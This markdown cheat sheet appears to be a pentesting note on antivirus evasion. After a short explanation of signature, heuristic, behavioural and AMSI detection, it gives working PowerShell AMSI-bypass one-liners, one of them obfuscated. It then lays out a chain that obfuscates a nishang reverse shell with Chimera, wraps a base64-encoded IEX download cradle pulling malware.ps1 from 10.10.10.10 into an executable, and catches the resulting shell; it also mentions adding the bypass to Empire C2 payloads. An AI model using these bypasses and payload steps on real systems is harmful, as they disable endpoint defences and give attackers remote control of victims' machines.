# AV Evasion

## Detection methods of antivirus

### Signature detection

* The antivirus checks if the binary matches any signature in its database.

### Heuristic detection

* The antivirus looks for patterns and system calls trying to decompile the binary and analyze its code.

### Behavioral detection

* Dynamically analyzes the binary. Runs the binary in a small controlled environment and looks for malicious actions.

### AMSI

* Antimalware Scan Interface (AMSI) is a Microsoft Windows component that allows the deeper inspection of built-in scripting services.
* Advanced malware uses scripts that are disguised or encrypted to avoid traditional methods of scanning. Such malware is often loaded directly into memory, so it does not use any files on the device. AMSI is an interface that applications and services that are running on Windows can use to send scanning requests to the antimalware product installed on the computer. This provides additional protection against harmful software that uses scripts or macros on core Windows components, such as PowerShell and Office365, or other applications to evade detection.

## AMSI evasion

* It is possible to disable AMSI by changing an attribute that is loaded in a powershell process:
  ```powershell
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
  ```
* This bypass has been added to the signature database so that not will work.
* The next powershell code is a version of obfuscated AMSI evasion:
  ```powershell
  $a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.SetValue($null,$true)
  ```
  
## Obfuscation

* Another technique to evade the antivirus is to obfuscate the malware. There are multiple tools to do this.

### Chimera

* [Chimera][2] is a PowerShell obfuscation script designed to bypass AMSI and antivirus solutions. It digests malicious PS1's known to trigger AV and uses string substitution and variable concatenation to evade common detection signatures.

## Reverse shell

* To get a reverse shell, we obfuscate the [nishang][3] shell with Chimera.
* Before obfuscation, we add the next line to the nishang script:
  ```powershell
  Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 443
  ```
* Obfuscate with Chimera:
  ```bash
  ./chimera.sh --file nishangShell.ps1  --all --output malware.ps1
  ```
* To trigger the reverse shell we can use [ps2exe][4] to create a binary with the next powershell code:
  ```powershell
  $A=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<code_base64>"))
  powershell -noprofile -ep bypass $A
  ```
* In `code_base64` we add the web request to our http server in base64:
  ```powershell
  IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/malware.ps1')
  ```
* Finally, we have the binary that will request the file malware.ps1 and inject it into memory, then, the reverse shell will be received by our machine.

## Command and Control (C2)

* To get a connection with the C2 [Empire][5], we will create a payload with empire and add the AMSI bypass.

## Creating malware

* [malapi][8] maps Windows APIs to common techniques used by malware.

## Further reading

* [AMSI Bypass Methods][6]
* [Amsi-Bypass-Powershell][7]

|Source: [*"Using AMSI integration to identify script-based attacks" from WithSecure*][1].|
|:--:|

[1]: https://help.f-secure.com/product.html?business/computer-protection-windows/latest/en/task_ED11EEBB08DD4583AFA13EA59D3FC768-latest-en
[2]: https://github.com/tokyoneon/Chimera.git 
[3]: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 
[4]: https://ps2exe.azurewebsites.net/ 
[5]: https://github.com/EmpireProject/Empire
[6]: https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/
[7]: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
[8]: https://malapi.io/
